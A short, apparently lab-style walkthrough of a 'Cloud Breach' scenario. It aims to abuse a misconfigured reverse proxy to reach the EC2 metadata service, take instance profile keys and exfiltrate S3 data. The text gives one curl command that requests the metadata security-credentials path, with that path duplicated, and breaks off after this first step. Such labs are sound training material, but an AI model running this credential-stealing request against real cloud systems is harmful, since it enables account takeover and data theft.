# Cloud Breach

Goal: Starting as an anonymous outsider with no access or privileges, exploit a misconfigured reverse-proxy server to query the EC2 metadata service and acquire instance profile keys. Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.

# Walk through
## Instance Metadata service vulnerability
``` curl http://<ec2 instance ip address>/latest/meta-data/latest/meta-data/iam/security-credentials
